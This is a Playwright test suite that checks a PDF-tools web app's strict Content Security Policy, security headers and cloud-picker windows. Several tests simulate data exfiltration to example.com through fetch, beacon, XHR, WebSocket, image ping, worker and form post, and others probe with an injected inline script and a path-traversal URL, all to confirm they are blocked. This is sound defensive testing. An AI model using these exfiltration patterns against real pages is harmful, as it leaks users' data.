/**
 * Q1: strict Content Security Policy and security headers (docs/process/backlog.md Q1).
 * Runs against the production server (`next start` after `pnpm build`): the per-page
 * script hashes only exist in a production build.
 */
import { readFile } from "node:fs/promises";
import { expect, test, type Page } from "@playwright/test";
import { inlineScriptHashes, scriptHash } from "../../scripts/csp-lib.mjs";
import { cloudPrepaintScript } from "../../src/lib/cloud/last-used";
import { recentPrepaintScript } from "../../src/lib/recent-tools";
import { cloudOn, downloadResult, fx, openRotate, pickReady, rotateRight, run, tiles } from "../support/flow";
import { isDesktop, menuSearch, openHydrated, openMenu, plannedTools, RECENT_KEY, usableTools } from "../f2/support";

const PAGES = ["/", ...usableTools.map((t) => `/${t.slug}`), ...plannedTools.map((t) => `/${t.slug}`), "/privacy", "/terms", "/cookies", "/licenses", "/about", "/help", "/security"];
const NOT_FOUND = ["/does-not-exist", "/rotate-pdf/x", "/merge-pdf/extra", "/_next/image?url=%2Ffile.svg&w=64&q=75", "/_next/static-x"];

const directives = (policy: string) => new Map(policy.split(/;\s*/).map((d) => [d.split(" ")[0], d.split(" ").slice(1)] as const));

/** Records every CSP violation (and CSP console error) the page reports, from before its first script runs. */
async function watchCsp(page: Page) {
  const consoleErrors: string[] = [];
  page.on("console", (m) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(m.text())) consoleErrors.push(m.text());
  });
  await page.addInitScript(() => {
    const w = window as Window & { __csp?: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => w.__csp!.push(`${e.effectiveDirective} ${e.blockedURI} ${e.sourceFile}:${e.lineNumber}`));
  });
  return async () => {
    const events = await page.evaluate(() => (window as Window & { __csp?: string[] }).__csp ?? []);
    return [...events, ...consoleErrors];
  };
}

test.describe("headers", () => {
  test.beforeEach(({}, info) => test.skip(!isDesktop(info.project.name), "HTTP-level checks; once on desktop"));

  test("every page sends the strict CSP with connect-src 'self', and the security headers", async ({ request }) => {
    for (const path of [...PAGES, ...NOT_FOUND]) {
      const res = await request.get(path);
      expect(res.status(), path).toBe(NOT_FOUND.includes(path) ? 404 : 200);
      const h = res.headers();
      const csp = h["content-security-policy"];
      expect(csp, path).toBeTruthy();
      const d = directives(csp);
      expect(d.get("connect-src"), path).toEqual(["'self'"]);
      expect(d.get("default-src"), path).toEqual(["'self'"]);
      expect(d.get("object-src"), path).toEqual(["'none'"]);
      expect(d.get("base-uri"), path).toEqual(["'self'"]);
      expect(d.get("frame-ancestors"), path).toEqual(["'none'"]);
      expect(d.get("form-action"), path).toEqual(["'self'"]);
      expect(d.get("worker-src"), path).toEqual(["'self'", "blob:"]);
      expect(d.get("img-src"), path).toEqual(["'self'", "blob:", "data:"]);
      expect(d.get("font-src"), path).toEqual(["'self'"]);
      expect(d.get("style-src"), path).toEqual(["'self'"]);
      expect(csp, path).not.toContain("'unsafe-inline'");
      expect(csp, path).not.toContain("'unsafe-eval'");
      expect(h["referrer-policy"], path).toBe("strict-origin-when-cross-origin");
      expect(h["x-content-type-options"], path).toBe("nosniff");
      expect(h["cross-origin-opener-policy"], path).toBe("same-origin");
      for (const f of ["camera=()", "microphone=()", "geolocation=()"]) expect(h["permissions-policy"], path).toContain(f);
      // One policy only: two CSP headers would both apply and could block each other's hashes.
      expect(res.headersArray().filter((x) => x.name.toLowerCase() === "content-security-policy"), path).toHaveLength(1);
    }
  });

  test("each page's CSP allows exactly the inline scripts in its own HTML, by hash", async ({ request }) => {
    for (const path of [...PAGES, ...NOT_FOUND]) {
      const res = await request.get(path);
      const html = await res.text();
      const allowed = new Set(directives(res.headers()["content-security-policy"]).get("script-src")!.filter((s) => s.startsWith("'sha256-")));
      const inline = inlineScriptHashes(html);
      expect(inline.length, path).toBeGreaterThan(0);
      for (const h of inline) expect(allowed.has(`'${h}'`), `${path}: inline script ${h} not in CSP`).toBe(true);
    }
  });

  test("the Recent-tools pre-paint script is allowed by its hash", async ({ request }) => {
    const csp = (await request.get("/")).headers()["content-security-policy"];
    const pre = recentPrepaintScript(usableTools.map((t) => t.slug));
    expect(csp).toContain(`'${scriptHash(pre)}'`);
  });

  test("static scripts and workers are served with the hash-free strict policy", async ({ request }) => {
    const html = await (await request.get("/rotate-pdf")).text();
    const src = html.match(/<script[^>]+src="(\/_next\/static\/[^"]+\.js)"/)![1];
    const res = await request.get(src);
    expect(res.status()).toBe(200);
    const d = directives(res.headers()["content-security-policy"]);
    expect(d.get("connect-src")).toEqual(["'self'"]);
    expect(d.get("script-src")).toEqual(["'self'", "'wasm-unsafe-eval'"]);
    expect(res.headers()["x-content-type-options"]).toBe("nosniff");
  });
});

test.describe("the browser enforces it", () => {
  test("a cross-origin fetch from the page is blocked with a CSP violation event", async ({ page }) => {
    await openHydrated(page, "/rotate-pdf");
    const result = await page.evaluate(async () => {
      const violation = new Promise<{ directive: string; blocked: string }>((resolve) =>
        document.addEventListener("securitypolicyviolation", (e) => resolve({ directive: e.effectiveDirective, blocked: e.blockedURI }), { once: true }),
      );
      const outcome = await fetch("https://example.com/upload", { method: "POST", body: "secret", mode: "no-cors" }).then(
        () => "sent",
        () => "blocked",
      );
      return { outcome, violation: await violation };
    });
    expect(result.outcome).toBe("blocked");
    expect(result.violation.directive).toBe("connect-src");
    expect(result.violation.blocked).toContain("https://example.com");
  });

  test("other ways out are blocked too: beacon, XHR, WebSocket, image ping, form post, and fetch from a worker", async ({ page }) => {
    const external: string[] = [];
    // Playwright reports blocked attempts as "request" + "requestfailed"; a request that really
    // went out would finish with a response.
    page.on("requestfinished", (r) => {
      if (!r.url().startsWith(new URL(page.url() || "http://localhost").origin) && /^https?:|^wss?:/.test(r.url())) external.push(r.url());
    });
    await openHydrated(page, "/rotate-pdf");
    const origin = new URL(page.url()).origin;
    external.length = 0;
    const res = await page.evaluate(async () => {
      const directives: string[] = [];
      document.addEventListener("securitypolicyviolation", (e) => directives.push(e.effectiveDirective));
      navigator.sendBeacon("https://example.com/beacon", "secret");
      const xhr = await new Promise<string>((resolve) => {
        const x = new XMLHttpRequest();
        x.onload = () => resolve("sent");
        x.onerror = () => resolve("blocked");
        try {
          x.open("POST", "https://example.com/xhr");
          x.send("secret");
        } catch {
          resolve("blocked");
        }
      });
      let ws = "blocked";
      try {
        const s = new WebSocket("wss://example.com/ws");
        ws = await new Promise((resolve) => {
          s.onopen = () => resolve("sent");
          s.onerror = () => resolve("blocked");
        });
      } catch {
        ws = "blocked";
      }
      const img = await new Promise<string>((resolve) => {
        const i = new Image();
        i.onload = () => resolve("sent");
        i.onerror = () => resolve("blocked");
        i.src = "https://example.com/pixel.gif?secret";
      });
      const fromWorker = await new Promise<string>((resolve) => {
        const code = "fetch('https://example.com/w',{method:'POST',body:'secret',mode:'no-cors'}).then(()=>postMessage('sent'),()=>postMessage('blocked'))";
        const w = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })));
        w.onmessage = (e) => resolve(e.data as string);
        w.onerror = () => resolve("worker failed");
      });
      const form = document.createElement("form");
      form.method = "post";
      form.action = "https://example.com/form";
      document.body.append(form);
      form.submit();
      await new Promise((r) => setTimeout(r, 500));
      return { xhr, ws, img, fromWorker, directives };
    });
    // sendBeacon only queues (it returns true); the CSP check happens when it is sent, reported below as connect-src.
    expect(res.xhr).toBe("blocked");
    expect(res.ws).toBe("blocked");
    expect(res.img).toBe("blocked");
    expect(res.fromWorker).toBe("blocked");
    expect(res.directives).toEqual(expect.arrayContaining(["connect-src", "img-src", "form-action"]));
    // fetch-from-worker violations are reported in the worker; the page saw beacon + XHR + WebSocket.
    expect(res.directives.filter((d) => d === "connect-src").length).toBeGreaterThanOrEqual(3);
    expect(new URL(page.url()).origin).toBe(origin); // the form post did not navigate away
    expect(external).toEqual([]);
  });

  test("an injected inline script does not run", async ({ page }) => {
    await openHydrated(page, "/");
    const ran = await page.evaluate(async () => {
      const s = document.createElement("script");
      s.textContent = "window.__injected = true";
      document.head.append(s);
      await new Promise((r) => setTimeout(r, 50));
      return (window as Window & { __injected?: boolean }).__injected === true;
    });
    expect(ran).toBe(false);
  });
});

test.describe("everything still works under the CSP, with no violations", () => {
  test("home: catalogue, search, menu, recent tools (pre-paint script), legal pages", async ({ page }) => {
    const violations = await watchCsp(page);
    await page.addInitScript((key) => localStorage.setItem(key, JSON.stringify(["rotate-pdf"])), RECENT_KEY);
    await openHydrated(page, "/");
    // The pre-paint script ran (it is inline, so only its hash lets it run).
    expect(await page.evaluate(() => document.documentElement.hasAttribute("data-recent"))).toBe(true);
    await expect(page.getByTestId("home-recent").locator('a[href="/rotate-pdf"]')).toBeVisible();
    await page.locator("#catalogue-search").fill("rot");
    await expect(page.locator('[data-testid=catalogue] a[href="/rotate-pdf"]').first()).toBeVisible();
    await page.locator("#catalogue-search").fill("");
    await openMenu(page);
    await menuSearch(page).fill("merge");
    await expect(page.getByTestId("tool-menu").locator('a[href="/merge-pdf"]')).toBeVisible();
    await page.keyboard.press("Escape");
    for (const path of ["/privacy", "/terms", "/cookies", "/licenses", "/merge-pdf", "/does-not-exist"]) {
      await page.goto(path);
      await expect(page.getByRole("heading", { level: 1 }), path).toBeVisible();
    }
    // Client-side navigation (RSC fetch) is same-origin.
    await openHydrated(page, "/privacy");
    await page.locator("main").getByRole("link", { name: "Rotate", exact: true }).click();
    await expect(page).toHaveURL(/\/rotate-pdf$/);
    await expect(page.locator("[data-testid=tool-flow][data-hydrated]")).toBeVisible();
    expect(await violations()).toEqual([]);
  });

  test("Rotate: thumbnails (pdf.js worker), processing worker, preview, download (blob URL), Share and paste", async ({ page }) => {
    const violations = await watchCsp(page);
    await page.addInitScript(() => {
      const nav = navigator as Navigator & { __shared?: number };
      nav.__shared = 0;
      nav.canShare = () => true;
      nav.share = async () => {
        nav.__shared!++;
      };
    });
    await openRotate(page);
    await pickReady(page, "three-pages.pdf");
    await expect(tiles(page)).toHaveCount(3);
    // pdf.js rendered real pixels into the first thumbnail.
    await expect
      .poll(() =>
        page.evaluate(() => {
          const c = document.querySelector("[data-testid=page-tile] canvas") as HTMLCanvasElement | null;
          if (!c || !c.width) return false;
          const d = c.getContext("2d")!.getImageData(0, 0, c.width, c.height).data;
          for (let i = 0; i < d.length; i += 4) if (d[i] < 250 || d[i + 1] < 250 || d[i + 2] < 250) return true;
          return false;
        }),
      )
      .toBe(true);
    await rotateRight(page).click();
    await run(page);
    await expect(page.getByTestId("result-preview")).toBeVisible();
    const out = await downloadResult(page);
    expect(out.bytes.length).toBeGreaterThan(100);
    await page.getByRole("button", { name: "Share" }).click();
    expect(await page.evaluate(() => (navigator as Navigator & { __shared?: number }).__shared)).toBe(1);

    await openRotate(page);
    const b64 = (await readFile(fx("three-pages.pdf"))).toString("base64");
    await page.evaluate((b64) => {
      const dt = new DataTransfer();
      dt.items.add(new File([Uint8Array.from(atob(b64), (c) => c.charCodeAt(0))], "pasted.pdf", { type: "application/pdf" }));
      document.body.dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
    }, b64);
    await expect(tiles(page)).toHaveCount(3);
    expect(await violations()).toEqual([]);
  });
});

/**
 * F23 cloud sources (docs/specs/f23-cloud-pickers.md AC-120, AC-127): tool pages keep the policy and
 * COOP above unchanged with the flag on or off; only /cloud/<provider> windows get their own
 * policy (src/lib/security/csp.ts cloudPolicy, unit-tested host by host) and COOP
 * same-origin-allow-popups. The mock build prerenders /cloud/mock only.
 */
test.describe("F23 cloud windows", () => {
  test.beforeEach(({}, info) => test.skip(!isDesktop(info.project.name), "HTTP-level checks; once on desktop"));

  test("without the flag there are no cloud routes; with it, only the built ones", async ({ request }) => {
    for (const p of ["google", "dropbox", "onedrive"]) expect((await request.get(`/cloud/${p}`)).status(), p).toBe(404);
    expect((await request.get("/cloud/mock")).status()).toBe(cloudOn ? 200 : 404);
    expect((await request.get("/cloud-mock/alpha.pdf")).status()).toBe(cloudOn ? 200 : 404);
    expect((await request.get("/cloud-mock/..%2Fpackage.json")).status()).toBe(404);
  });

  test("AC-120, AC-127: tool pages: same policy and COOP; the cloud pre-paint script is hashed only when the flag is on", async ({ request }) => {
    const pre = cloudPrepaintScript(["google", "dropbox", "onedrive"]);
    for (const path of ["/rotate-pdf", "/merge-pdf"]) {
      const res = await request.get(path);
      const csp = res.headers()["content-security-policy"];
      expect(res.headers()["cross-origin-opener-policy"], path).toBe("same-origin");
      const d = directives(csp);
      for (const k of ["connect-src", "frame-src", "form-action"]) expect(d.get(k) ?? ["'self'"], `${path} ${k}`).not.toContain("https:");
      // AC-127: no wildcard or scheme-only source where code, connections or frames come from.
      for (const k of ["script-src", "connect-src", "frame-src"])
        for (const bad of ["*", "https:", "http:"]) expect(d.get(k) ?? [], `${path} ${k}`).not.toContain(bad);
      expect(d.get("frame-ancestors"), path).toEqual(["'none'"]);
      expect(d.get("script-src"), path).not.toContain("'unsafe-inline'");
      expect(d.get("script-src"), path).not.toContain("'unsafe-eval'");
      expect(d.get("connect-src")).toEqual(["'self'"]);
      expect(csp).not.toMatch(/dropbox|google|microsoft|1drv/);
      expect(csp.includes(`'${scriptHash(pre)}'`), path).toBe(cloudOn);
    }
  });

  test("/cloud/mock: its own strict policy, COOP same-origin-allow-popups, every inline script hashed", async ({ request }) => {
    test.skip(!cloudOn, "needs the cloud mock build");
    const res = await request.get("/cloud/mock?req=x");
    const h = res.headers();
    expect(h["cross-origin-opener-policy"]).toBe("same-origin-allow-popups");
    expect(h["referrer-policy"]).toBe("no-referrer"); // like /cloud/google: its URL carries the request
    const csp = h["content-security-policy"];
    const d = directives(csp);
    expect(d.get("connect-src")).toEqual(["'self'"]);
    expect(d.get("frame-src")).toEqual(["'none'"]);
    expect(d.get("frame-ancestors")).toEqual(["'none'"]);
    expect(d.get("form-action")).toEqual(["'self'"]);
    expect(csp).not.toContain("'unsafe-inline'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(res.headersArray().filter((x) => x.name.toLowerCase() === "content-security-policy")).toHaveLength(1);
    const allowed = new Set(d.get("script-src")!.filter((s) => s.startsWith("'sha256-")));
    for (const hash of inlineScriptHashes(await res.text())) expect(allowed.has(`'${hash}'`), hash).toBe(true);
    expect(h["x-robots-tag"] ?? (await res.text())).toMatch(/noindex/);
  });

  test("a full mock pick runs with no CSP violation in the tool tab or the window", async ({ page }) => {
    test.skip(!cloudOn, "needs the cloud mock build");
    const toolViolations = await watchCsp(page);
    await openRotate(page);
    // Cloud sources live in the upload caret's menu (the one place, owner 2026-11-27).
    await page.getByTestId("cloud-caret").click();
    const [win] = await Promise.all([page.context().waitForEvent("page"), page.getByRole("menuitem", { name: /^Dropbox/ }).click()]);
    const winViolations: string[] = [];
    win.on("console", (m) => /Content Security Policy/i.test(m.text()) && winViolations.push(m.text()));
    await win.getByTestId("cloud-open").click();
    await win.getByTestId("mock-picker").getByRole("group").getByLabel("alpha.pdf", { exact: true }).check();
    await win.getByRole("button", { name: "Pick", exact: true }).click();
    await expect(tiles(page)).toHaveCount(3);
    expect(winViolations).toEqual([]);
    expect(await toolViolations()).toEqual([]);
  });
});
